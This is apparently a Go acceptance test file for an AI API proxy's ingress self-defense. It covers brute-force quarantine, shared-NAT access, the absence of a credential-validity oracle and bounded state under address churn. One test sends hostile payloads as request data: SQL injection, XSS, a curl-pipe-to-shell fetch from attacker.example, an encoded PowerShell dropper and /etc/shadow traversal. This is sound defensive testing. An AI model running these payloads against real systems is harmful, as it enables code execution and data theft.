// This file is the end-to-end acceptance certification of ingress self-defense
// (spec GROUP 7, tasks 7.1 and 7.2) driven through the REAL composed standard
// distribution stack.
//
// Every request here travels the actual [stdhttp.ComposeStandardHTTP] handler
// graph of a compiled generation, over the real local-stub backend through the
// real OpenAI Responses frontend, behind the real process-owned adaptive state
// and the real Prometheus registry. The fixture is the same standard
// configuration shape the reload suite uses, so no request is answered by a
// test double: the "legitimate frontend" of the shared-NAT scenario is a real
// model round trip, not a mounted stub.
//
// The composed reload, trusted-forwarding chain, process-metrics and management
// recovery properties are certified in self_defense_reload_test.go,
// self_defense_metrics_e2e_test.go and
// admin/configreload/self_defense_management_isolation_test.go; this file only
// adds what those cannot observe: the shared-address sequence, the
// body-content guarantee, the absence of a credential-validity oracle, and the
// bounded unique-address churn through the real stack.
package runtimebundle_test

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"net/netip"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/aiproxer/aiproxer/internal/core/config"
	"github.com/aiproxer/aiproxer/internal/core/ingressdefense"
	"github.com/aiproxer/aiproxer/internal/infra/runtimebundle"
)

// acceptanceFixtureKey is the only credential the standard local API-key chain
// of this file accepts. It satisfies the configured minimum key length and exists
// solely to make the real transport-auth chain answerable.
const acceptanceFixtureKey = "sk-aip-self-defense-0123456789"

// acceptanceFixtureWrongKey is a well-formed credential the real chain rejects,
// so a request carrying it exercises the terminal 401 path.
const acceptanceFixtureWrongKey = "sk-aip-self-defense-wrong-0001"

// acceptanceModelRoute is the route hint the real OpenAI Responses frontend
// requires; the default route of the fixture resolves to the local stub.
const acceptanceModelRoute = "sd-reload-stub:stub-default"

// acceptanceChurnCapacity is the adaptive-state capacity the churn fixture
// configures. It is the documented v1 floor, so the churn is driven through the
// real validated configuration surface rather than a test-only value.
const acceptanceChurnCapacity = 1024

// churnGoroutineTolerance absorbs unrelated process-wide goroutine churn in the
// isolated child. It is deliberately tiny next to the 2048 unique addresses this
// test drives, so it cannot mask a per-address goroutine or timer.
const churnGoroutineTolerance = 4

// acceptanceJitter is the explicit offset used to tell a fresh first-offense
// quarantine window apart from a resumed doubled one, with no wall-clock wait.
const acceptanceJitter = time.Minute

// acceptanceResponsesWire is the part of the real OpenAI Responses reply this
// file asserts on. Reading the model name back out of the wire response is how
// the body-content guarantee is proven observably: a request-body string can only
// appear there if the exact bytes were decoded by the frontend and carried
// through to the backend.
type acceptanceResponsesWire struct {
	ID     string `json:"id"`
	Status string `json:"status"`
	Model  string `json:"model"`
}

// acceptanceStack is one fully composed standard data-plane stack plus the
// process-owned state and metrics the assertions read.
type acceptanceStack struct {
	handler  http.Handler
	ps       *runtimebundle.ProcessServices
	policy   *ingressdefense.Policy
	maxEntry int
}

// acceptanceConfig is one fully validated standard-distribution config whose
// only self-defense variation is what the test changes. It mirrors the reload
// suite's fixture, so a config built here differs only in the field under test,
// and it always runs with metrics enabled because the bounded-cardinality
// evidence is read from the real process registry.
func acceptanceConfig(t *testing.T, mutate func(*config.Config)) *config.Config {
	t.Helper()
	return sdReloadConfig(t, func(c *config.Config) {
		// A loopback data-plane address keeps the metrics exposure rule
		// satisfied without a shared secret. Nothing here binds it: the
		// composition path only ever builds a handler.
		c.Server.Address = "127.0.0.1:0"
		c.Observability.Metrics.Enabled = true
		c.Observability.Metrics.Path = "/metrics"
		if mutate != nil {
			mutate(c)
		}
	})
}

func newAcceptanceStack(t *testing.T, cfg *config.Config) acceptanceStack {
	t.Helper()
	ps := sdReloadHost(t, cfg)
	compiled := sdReloadCompile(t, ps, cfg, nil)
	if compiled.policy == nil || !compiled.policy.Enabled {
		t.Fatal("the fixture must publish an enabled self-defense generation policy")
	}
	if compiled.state != ps.IngressDefense {
		t.Fatal("the generation must borrow the process-owned adaptive state")
	}
	if compiled.plane.Handler() == nil {
		t.Fatal("the composed generation must publish a request handler")
	}
	if ps.Metrics == nil || ps.Metrics.SelfDefense == nil {
		t.Fatal("the process must own the real self-defense collector")
	}
	if cfg.Access.SelfDefense.Adaptive.MaxEntries == nil {
		t.Fatal("the fixture must configure an explicit adaptive-state capacity")
	}
	return acceptanceStack{
		handler:  compiled.plane.Handler(),
		ps:       ps,
		policy:   compiled.policy,
		maxEntry: *cfg.Access.SelfDefense.Adaptive.MaxEntries,
	}
}

// acceptanceServe drives one request through a composed stack. The fixture's only
// forwarding-trust configuration is a /8 proxy hop, so every client identity in
// this file travels as a forwarded hop. credential is written as a bearer token
// when non-empty, and route is the frontend's required route hint.
func acceptanceServe(h http.Handler, method, target, clientAddr, credential, route, body string) *httptest.ResponseRecorder {
	req := httptest.NewRequest(method, "http://data-plane.test"+target, strings.NewReader(body))
	req.RemoteAddr = "10.0.0.9:1234"
	req.Header.Set("X-Forwarded-For", clientAddr)
	req.Header.Set("Content-Type", "application/json")
	if credential != "" {
		req.Header.Set("Authorization", "Bearer "+credential)
	}
	if route != "" {
		req.Header.Set("X-AIP-Route", route)
	}
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	return rec
}

// acceptanceAddr parses one fixture source address literal.
func acceptanceAddr(t *testing.T, host string) netip.Addr {
	t.Helper()
	addr, err := netip.ParseAddr(host)
	if err != nil {
		t.Fatalf("parse fixture address %q: %v", host, err)
	}
	return addr
}

// acceptanceJSONString renders s as a JSON string literal for a request body.
func acceptanceJSONString(t *testing.T, s string) string {
	t.Helper()
	encoded, err := json.Marshal(s)
	if err != nil {
		t.Fatal(err)
	}
	return string(encoded)
}

// acceptanceDecodeResponses decodes a real frontend response and fails the test
// when it is not a completed model response.
func acceptanceDecodeResponses(t *testing.T, rec *httptest.ResponseRecorder) acceptanceResponsesWire {
	t.Helper()
	var wire acceptanceResponsesWire
	if err := json.Unmarshal(rec.Body.Bytes(), &wire); err != nil {
		t.Fatalf("decode the real frontend response %q: %v", rec.Body.String(), err)
	}
	if wire.Status != "completed" || wire.ID == "" {
		t.Fatalf("real frontend response = %+v, want a completed model response", wire)
	}
	return wire
}

// TestAcceptanceSharedAddressValidCredentialReachesTheRealFrontend is the
// composed shared-NAT scenario of requirements 5.1-5.3, driven as one request
// sequence through the real standard distribution stack.
//
// One hostile actor at address X drives X past the configured auth-failure
// threshold with the real local API-key chain; the conservative probe then
// refuses X's own credential-free traffic in front of authentication; and a
// legitimate user behind the SAME public address still authenticates and gets a
// COMPLETED model response from the real frontend and real backend, clearing X's
// exact adaptive entry on the way.
//
// The success leg is a real model round trip with a decoded wire response, so it
// cannot pass on a status code alone: a gate that refused, short-circuited or
// degraded the request would produce no completed response at all.
func TestAcceptanceSharedAddressValidCredentialReachesTheRealFrontend(t *testing.T) {
	t.Parallel()

	const hostile = "203.0.113.40"
	stack := newAcceptanceStack(t, acceptanceConfig(t, nil))

	// A brute-force actor on the shared address: one wrong credential per
	// request until the configured threshold starts a quarantine.
	for i := range stack.policy.AuthFailures {
		rec := acceptanceServe(stack.handler, http.MethodGet, "/v1/models", hostile, acceptanceFixtureWrongKey, "", "")
		if rec.Code != http.StatusUnauthorized {
			t.Fatalf("hostile request %d = %d, want the real auth chain's 401", i+1, rec.Code)
		}
	}
	addr := acceptanceAddr(t, hostile)
	if !stack.ps.IngressDefense.IsQuarantined(addr, time.Now()) {
		t.Fatal("the counted unauthenticated failures must start a quarantine for the shared address")
	}
	if got := stack.ps.IngressDefense.Len(); got != 1 {
		t.Fatalf("adaptive entries = %d, want exactly the shared address", got)
	}

	// The quarantine now refuses the attacker's own credential-free traffic in
	// front of authentication, before any auth or model work.
	rec := acceptanceServe(stack.handler, http.MethodGet, "/v1/models", hostile, "", "", "")
	if rec.Code != http.StatusTooManyRequests {
		t.Fatalf("credential-free request from a quarantined address = %d, want the generic 429", rec.Code)
	}
	if rec.Body.String() != "Too Many Requests\n" {
		t.Fatalf("quarantine refusal body = %q, want the generic body", rec.Body.String())
	}
	if got := acceptanceSelfDefenseSeries(t, stack.ps)["aip_self_defense_denials_total{reason=active_quarantine}"]; got != 1 {
		t.Fatalf("active-quarantine denials = %v, want the single pre-auth refusal", got)
	}

	// The legitimate user on the SAME address presents a valid credential and
	// gets a real, completed model response from the real frontend and backend.
	rec = acceptanceServe(stack.handler, http.MethodPost, "/v1/responses", hostile, acceptanceFixtureKey, acceptanceModelRoute,
		`{"model":"stub-default","input":"hello from the shared address"}`)
	if rec.Code != http.StatusOK {
		t.Fatalf("valid credential on a quarantined address = %d, want the real frontend's 200: %s", rec.Code, rec.Body.String())
	}
	if wire := acceptanceDecodeResponses(t, rec); wire.Model != "stub-default" {
		t.Fatalf("real frontend echoed model %q, want the requested model", wire.Model)
	}
	if got := stack.ps.IngressDefense.Len(); got != 0 {
		t.Fatalf("adaptive entries after a full successful chain = %d, want the exact address cleared", got)
	}
}

// TestAcceptanceNoCredentialValidityOracleAtTheComposedStack pins requirement
// 9.6. The self-defense gate may only answer a question about credential
// PRESENCE, and it may never become an oracle about credential VALIDITY: a
// well-formed but invalid credential on a quarantined address must still be
// answered by the pre-existing authentication semantics, byte for byte, while
// only a request that provably carries no credential at all is refused in front
// of authentication.
//
// The baseline is the very same request against the very same chain on a
// NON-quarantined address, so any extra status, body or header the feature
// introduced would show up as a difference.
func TestAcceptanceNoCredentialValidityOracleAtTheComposedStack(t *testing.T) {
	t.Parallel()

	const quarantined = "203.0.113.41"
	const clean = "203.0.113.42"
	stack := newAcceptanceStack(t, acceptanceConfig(t, nil))

	// The baseline: the pre-existing 401 of the real chain for a wrong
	// credential, rendered on an address self-defense has no opinion about.
	baseline := acceptanceServe(stack.handler, http.MethodGet, "/v1/models", clean, acceptanceFixtureWrongKey, "", "")

	for i := range stack.policy.AuthFailures {
		rec := acceptanceServe(stack.handler, http.MethodGet, "/v1/models", quarantined, acceptanceFixtureWrongKey, "", "")
		if rec.Code != http.StatusUnauthorized {
			t.Fatalf("hostile request %d = %d, want the real auth chain's 401", i+1, rec.Code)
		}
	}
	if !stack.ps.IngressDefense.IsQuarantined(acceptanceAddr(t, quarantined), time.Now()) {
		t.Fatal("the fixture must leave the address quarantined")
	}

	// An INVALID credential on the quarantined address is still answered by the
	// pre-existing authentication semantics. If the gate leaked validity, this
	// would be the pre-auth 429 instead.
	onQuarantine := acceptanceServe(stack.handler, http.MethodGet, "/v1/models", quarantined, acceptanceFixtureWrongKey, "", "")
	if onQuarantine.Code != baseline.Code {
		t.Fatalf("invalid credential on a quarantined address = %d, want the pre-existing %d: a pre-auth refusal would be a credential-validity oracle",
			onQuarantine.Code, baseline.Code)
	}
	if onQuarantine.Body.String() != baseline.Body.String() {
		t.Fatalf("quarantined invalid-credential body = %q, want the pre-existing %q",
			onQuarantine.Body.String(), baseline.Body.String())
	}
	for _, header := range []string{"Content-Type", "Www-Authenticate", "X-Content-Type-Options", "Retry-After"} {
		if got, want := onQuarantine.Header().Get(header), baseline.Header().Get(header); got != want {
			t.Fatalf("quarantined response header %s = %q, want the pre-existing %q", header, got, want)
		}
	}

	// A request that provably carries no credential at all IS refused in front
	// of authentication, which is a presence answer and not a validity one, and
	// the generic refusal discloses nothing at all.
	credentialFree := acceptanceServe(stack.handler, http.MethodGet, "/v1/models", quarantined, "", "", "")
	if credentialFree.Code != http.StatusTooManyRequests {
		t.Fatalf("credential-free request on a quarantined address = %d, want the generic 429", credentialFree.Code)
	}
	if credentialFree.Body.String() != "Too Many Requests\n" {
		t.Fatalf("pre-auth refusal body = %q, want the generic body", credentialFree.Body.String())
	}
	body := strings.ToLower(credentialFree.Body.String())
	for _, marker := range []string{
		acceptanceFixtureKey, acceptanceFixtureWrongKey, quarantined,
		"unauthorized", "quarantine", "offense", "threshold", "reason", "auth_fail",
	} {
		if strings.Contains(body, strings.ToLower(marker)) {
			t.Fatalf("pre-auth refusal body %q discloses %q", credentialFree.Body.String(), marker)
		}
	}
	if got := credentialFree.Header().Get("Retry-After"); got != "" {
		t.Fatalf("pre-auth refusal Retry-After = %q, want none: the deadline must not be disclosed", got)
	}
}

// TestAcceptanceSuccessIsNotPermanentTrustAtTheComposedStack pins requirement
// 5.5 at the composed level. A successful authentication is a reset, never a
// trust cache: the same address is still refused deterministically for an
// impossible path afterwards, and the later hostile event builds FRESH adaptive
// state whose window is the configured first-offense one rather than a resumed
// escalation.
func TestAcceptanceSuccessIsNotPermanentTrustAtTheComposedStack(t *testing.T) {
	t.Parallel()

	const shared = "203.0.113.43"
	stack := newAcceptanceStack(t, acceptanceConfig(t, nil))
	addr := acceptanceAddr(t, shared)
	// The composed process state is driven by the real clock, so the scenario
	// reads the state at explicit offsets around the configured first-offense
	// window rather than waiting for it.
	start := time.Now()

	rec := acceptanceServe(stack.handler, http.MethodPost, "/v1/responses", shared, acceptanceFixtureKey, acceptanceModelRoute,
		`{"model":"stub-default","input":"first"}`)
	if rec.Code != http.StatusOK {
		t.Fatalf("valid credential = %d, want the real frontend's 200: %s", rec.Code, rec.Body.String())
	}
	if got := stack.ps.IngressDefense.Len(); got != 0 {
		t.Fatalf("adaptive entries after the success = %d, want 0", got)
	}

	// A prior success must not exempt a later deterministic refusal, and it must
	// not matter that the request carries a valid credential.
	rec = acceptanceServe(stack.handler, http.MethodGet, "/.env", shared, acceptanceFixtureKey, "", "")
	if rec.Code != http.StatusNotFound || rec.Body.String() != "Not Found\n" {
		t.Fatalf("impossible path after a success = %d %q, want the generic 404", rec.Code, rec.Body.String())
	}
	if !stack.ps.IngressDefense.IsQuarantined(addr, time.Now()) {
		t.Fatal("a hostile event after a successful chain must build fresh adaptive state")
	}
	// Freshness is observable, not asserted: a fresh first-offense quarantine
	// ends at the initial window, while a state that had silently retained its
	// pre-clear offense level would still be inside the doubled window.
	if !stack.ps.IngressDefense.IsQuarantined(addr, start.Add(stack.policy.InitialQuarantine-acceptanceJitter)) {
		t.Fatal("the fresh first-offense window must still be active just before it expires")
	}
	if stack.ps.IngressDefense.IsQuarantined(addr, start.Add(stack.policy.InitialQuarantine+acceptanceJitter)) {
		t.Fatal("the fresh state must stop at the first-offense window: a cleared entry may not resume its old offense level")
	}
	if got := stack.ps.IngressDefense.Len(); got != 1 {
		t.Fatalf("adaptive entries = %d, want exactly the fresh entry for the shared address", got)
	}
}

// TestAcceptanceBodyContentNeverRefusesALegitimateLLMRoute is the composed
// body-content-neutrality guarantee of requirement 10.3. Prompt and model text
// containing SQL injection strings, XSS payloads, shell commands,
// malware-analysis prose or traversal examples on an otherwise legitimate proxy
// route must not match self-defense, and the exact bytes must reach the real
// frontend and the real backend.
//
// The proof is a round trip, not a status code: the hostile string is placed in
// the request body's model name, the real frontend decodes it, the real backend
// answers, and the SAME string is read back out of the wire response. A gate
// that inspected, refused, rewrote or truncated the body could not produce it.
func TestAcceptanceBodyContentNeverRefusesALegitimateLLMRoute(t *testing.T) {
	t.Parallel()

	stack := newAcceptanceStack(t, acceptanceConfig(t, nil))

	for i, tc := range []struct {
		name    string
		payload string
	}{
		{name: "SQL injection", payload: `'; DROP TABLE users; --`},
		{name: "XSS", payload: `<script>alert(document.cookie)</script>`},
		{name: "shell command", payload: `$(curl -s http://attacker.example/x.sh|sh)`},
		{name: "malware analysis prose", payload: `powershell -enc SQBFAFgA (obfuscated dropper)`},
		{name: "path traversal", payload: `../../../../etc/shadow`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			// Deliberately sequential: the cases share one composed generation
			// and therefore one bounded decode-admission budget, which is an
			// unrelated pre-existing server limit and must not be what this
			// guarantee is measured against. Each case still uses its own source
			// address, so a refusal could never be attributed to another case's
			// accumulated state.
			addr := netip.AddrFrom4([4]byte{198, 51, 100, byte(100 + i)}).String()
			body := `{"model":` + acceptanceJSONString(t, tc.payload) +
				`,"input":` + acceptanceJSONString(t, "triage this: "+tc.payload) + `}`
			rec := acceptanceServe(stack.handler, http.MethodPost, "/v1/responses", addr, acceptanceFixtureKey, acceptanceModelRoute, body)
			if rec.Code != http.StatusOK {
				t.Fatalf("legitimate LLM request carrying %s = %d, want the real frontend's 200: self-defense must never refuse on body content (%s)",
					tc.name, rec.Code, rec.Body.String())
			}
			wire := acceptanceDecodeResponses(t, rec)
			if wire.Model != tc.payload {
				t.Fatalf("real frontend echoed model %q, want the exact request-body content %q", wire.Model, tc.payload)
			}
		})
	}
}

// TestAcceptanceBoundedUniqueAddressChurnThroughTheRealStack is the composed
// resource-bounds proof of requirements 6.1-6.3 and 9.3-9.4. It drives twice
// the configured adaptive-state capacity of DISTINCT hostile source addresses
// through the real composed standard distribution stack and certifies that:
//
//   - the entry count stays exactly at the configured cap;
//   - the gathered Prometheus series count does NOT grow with the number of
//     unique addresses, and every self-defense label value stays inside the
//     closed reason vocabulary;
//   - the process goroutine count is identical before and after the churn, so no
//     per-address goroutine or timer is ever created.
//
// The goroutine assertion runs in an isolated process so unrelated background
// work from preceding tests cannot change its process-wide baseline. It is
// taken around churn only, after a warm-up round has driven the stack.
func TestAcceptanceBoundedUniqueAddressChurnThroughTheRealStack(t *testing.T) {
	const childMarker = "AIP_TEST_SELF_DEFENSE_CHURN_CHILD"
	isolated := os.Getenv(childMarker) == "1"
	if !isolated {
		ctx, cancel := context.WithTimeout(t.Context(), 30*time.Second)
		defer cancel()
		cmd := exec.CommandContext(ctx, os.Args[0], "-test.run=^TestAcceptanceBoundedUniqueAddressChurnThroughTheRealStack$", "-test.count=1")
		cmd.Env = append(os.Environ(), childMarker+"=1")
		if output, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("isolated churn certification failed: %v\n%s", err, output)
		}
	}
	cfg := acceptanceConfig(t, func(c *config.Config) {
		c.Access.SelfDefense.Adaptive.MaxEntries = new(acceptanceChurnCapacity)
	})
	stack := newAcceptanceStack(t, cfg)
	capacity := stack.maxEntry
	if capacity != acceptanceChurnCapacity {
		t.Fatalf("configured adaptive-state capacity = %d, want the fixture value %d", capacity, acceptanceChurnCapacity)
	}
	churn := 2 * capacity

	// Warm-up: drive enough hostile addresses to fill the stack's lazily
	// initialized request-path state before the goroutine baseline is taken.
	warm := sdReloadChurn(64)
	for _, addr := range warm {
		if rec := sdReloadServe(t, stack.handler, "/.env", addr.String()); rec.Code != http.StatusNotFound {
			t.Fatalf("warm-up impossible path = %d, want the generic 404", rec.Code)
		}
	}
	// Prometheus Gather itself launches transient collector goroutines. The
	// isolated resource proof measures churn before invoking any Gather; the
	// parent retains the complete state/cardinality proof below.
	if isolated {
		before := runtime.NumGoroutine()
		for _, addr := range sdReloadChurn(churn) {
			if rec := sdReloadServe(t, stack.handler, "/.env", addr.String()); rec.Code != http.StatusNotFound {
				t.Fatalf("churn impossible path = %d, want the generic 404", rec.Code)
			}
		}
		// runtime.NumGoroutine() is a process-wide count, so unrelated Go runtime
		// and background goroutines can retire during the churn. A real per-address
		// leak would add one goroutine per unique address, and this churn drives
		// 2*acceptanceChurnCapacity = 2048 of them, so a small tolerance still fails
		// decisively on any actual leak while tolerating that noise. Exact equality
		// made this gate fail on a DECREASE (observed 5 -> 4) under parallel load,
		// which is not a leak at all.
		if delta := runtime.NumGoroutine() - before; delta > churnGoroutineTolerance || delta < -churnGoroutineTolerance {
			t.Fatalf("goroutines = %d after the churn (baseline %d, delta %+d, tolerance %d): "+
				"adaptive state must create no per-address goroutine or timer",
				runtime.NumGoroutine(), before, delta, churnGoroutineTolerance)
		}
		return
	}
	warmSeries := acceptanceSelfDefenseSeries(t, stack.ps)

	// The churn itself: twice the configured capacity of distinct hostile
	// addresses, each refused deterministically by the fixed matcher before any
	// authentication or model work.
	for _, addr := range sdReloadChurn(churn) {
		if rec := sdReloadServe(t, stack.handler, "/.env", addr.String()); rec.Code != http.StatusNotFound {
			t.Fatalf("churn impossible path = %d, want the generic 404", rec.Code)
		}
	}

	// 1. Bounded state: the store is exactly at its configured cap, never above
	// it and never proportional to the number of unique addresses.
	if got := stack.ps.IngressDefense.Len(); got != capacity {
		t.Fatalf("adaptive entries after %d unique hostile addresses = %d, want exactly the configured cap %d",
			churn, got, capacity)
	}

	// 2. Bounded metric cardinality: the series count is unchanged by the churn,
	// the entry gauge tracks the cap, and every reason label stays inside the
	// closed vocabulary.
	series := acceptanceSelfDefenseSeries(t, stack.ps)
	if len(series) != len(warmSeries) {
		t.Fatalf("self-defense series count = %d after the churn, want the warm-up count %d: metric cardinality must not grow with unique addresses (%v vs %v)",
			len(series), len(warmSeries), series, warmSeries)
	}
	if got := series["aip_self_defense_state_entries"]; got != float64(capacity) {
		t.Fatalf("entry gauge = %v, want the cap %d", got, capacity)
	}
	if got := series["aip_self_defense_denials_total{reason=impossible_path}"]; got != float64(len(warm)+churn) {
		t.Fatalf("impossible-path denials = %v, want one per hostile address %d", got, len(warm)+churn)
	}
	acceptanceAssertClosedReasonLabels(t, series)

	// 3. The isolated child certified the identical churn's exact goroutine bound.
}

// TestAcceptanceChurnIsObservedByTheRealRegistry pins the observability half of
// the churn guarantee: the bounded self-defense collector of the REAL process
// registry is the one every generation projects, so the bounded-cardinality
// evidence above is read from production wiring rather than from a test
// collector, and several generations never open duplicate series.
func TestAcceptanceChurnIsObservedByTheRealRegistry(t *testing.T) {
	t.Parallel()

	cfg := acceptanceConfig(t, nil)
	ps := sdReloadHost(t, cfg)
	if ps.Metrics == nil || ps.Metrics.SelfDefense == nil {
		t.Fatal("the process must own the real self-defense collector")
	}
	first := sdReloadCompile(t, ps, cfg, nil)
	second := sdReloadCompile(t, ps, cfg, nil)
	if first.policy == nil || second.policy == nil {
		t.Fatal("both generations must project an enabled self-defense policy")
	}
	if first.state != second.state {
		t.Fatal("both generations must borrow the identical process-owned state instance")
	}
	if rec := sdReloadServe(t, first.plane.Handler(), "/.env", "203.0.113.50"); rec.Code != http.StatusNotFound {
		t.Fatalf("first generation impossible path = %d, want the generic 404", rec.Code)
	}
	if rec := sdReloadServe(t, second.plane.Handler(), "/.env", "203.0.113.51"); rec.Code != http.StatusNotFound {
		t.Fatalf("second generation impossible path = %d, want the generic 404", rec.Code)
	}
	series := acceptanceSelfDefenseSeries(t, ps)
	if got := series["aip_self_defense_denials_total{reason=impossible_path}"]; got != 2 {
		t.Fatalf("impossible-path denials = %v, want one per generation request (2)", got)
	}
	if got := series["aip_self_defense_state_entries"]; got != 2 {
		t.Fatalf("entry gauge = %v, want one entry per hostile address (2)", got)
	}
	acceptanceAssertClosedReasonLabels(t, series)
}

// acceptanceSelfDefenseSeries returns the self-defense exposition keyed by
// "name{reason=...}"; the label-free entry gauge is keyed by its bare name. It
// reads the REAL process registry, so the cardinality evidence is production
// wiring.
func acceptanceSelfDefenseSeries(t *testing.T, ps *runtimebundle.ProcessServices) map[string]float64 {
	t.Helper()
	if ps.Metrics == nil {
		return nil
	}
	families, err := ps.Metrics.Registry.Gather()
	if err != nil {
		t.Fatal(err)
	}
	out := map[string]float64{}
	for _, family := range families {
		if !strings.HasPrefix(family.GetName(), "aip_self_defense_") {
			continue
		}
		for _, metric := range family.GetMetric() {
			key := family.GetName()
			if len(metric.GetLabel()) == 1 {
				key += "{" + metric.GetLabel()[0].GetName() + "=" + metric.GetLabel()[0].GetValue() + "}"
			}
			switch {
			case metric.GetCounter() != nil:
				out[key] = metric.GetCounter().GetValue()
			case metric.GetGauge() != nil:
				out[key] = metric.GetGauge().GetValue()
			}
		}
	}
	return out
}

// acceptanceAssertClosedReasonLabels certifies the bounded-cardinality property
// structurally: the only unlabelled self-defense series is the entry gauge, and
// every other series carries exactly the single finite "reason" label whose
// value is a member of the closed vocabulary. The total series count is therefore
// bounded by construction, independently of how many addresses were seen.
func acceptanceAssertClosedReasonLabels(t *testing.T, series map[string]float64) {
	t.Helper()
	if series == nil {
		t.Fatal("the fixture must run with a real metrics registry")
	}
	closed := make(map[string]struct{}, len(ingressdefense.AllReasons()))
	for _, reason := range ingressdefense.AllReasons() {
		closed[string(reason)] = struct{}{}
	}
	labelled, plain := 0, 0
	for key := range series {
		name, labelledPart, isLabelled := strings.Cut(key, "{")
		if !isLabelled {
			plain++
			if name != "aip_self_defense_state_entries" {
				t.Fatalf("unlabelled self-defense series %q: only the entry gauge may carry no label", name)
			}
			continue
		}
		labelled++
		if !strings.HasPrefix(name, "aip_self_defense_") {
			t.Fatalf("unexpected self-defense series %q", name)
		}
		label, value, ok := strings.Cut(strings.TrimSuffix(labelledPart, "}"), "=")
		if !ok || label != "reason" {
			t.Fatalf("series %q must carry exactly the single finite reason label", key)
		}
		if _, ok := closed[value]; !ok {
			t.Fatalf("series %q has reason label %q outside the closed vocabulary", key, value)
		}
	}
	if maxSeries := 2*len(ingressdefense.AllReasons()) + 1; labelled+plain > maxSeries {
		t.Fatalf("self-defense series = %d, want at most the closed bound %d", labelled+plain, maxSeries)
	}
	if plain != 1 {
		t.Fatalf("unlabelled self-defense series = %d, want exactly the entry gauge", plain)
	}
}
